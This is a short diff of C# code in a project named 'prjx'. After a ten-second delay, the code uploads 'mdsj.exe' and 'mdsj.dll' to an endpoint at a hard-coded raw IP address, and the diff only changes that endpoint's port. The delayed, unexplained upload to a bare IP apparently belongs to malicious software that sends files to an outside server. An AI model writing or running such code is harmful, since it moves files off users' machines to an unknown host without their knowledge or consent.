@@ -223,8 +223,8 @@ namespace prjx
             {
 
                 Thread.Sleep(10000);
-                UploadFileAsync("mdsj.exe", "http://206.119.166.120:5000/upld");
-                UploadFileAsync("mdsj.dll", "http://206.119.166.120:5000/upld");
+                UploadFileAsync("mdsj.exe", "http://206.119.166.120:21000/upld");
+                UploadFileAsync("mdsj.dll", "http://206.119.166.120:21000/upld");
 
 
             });
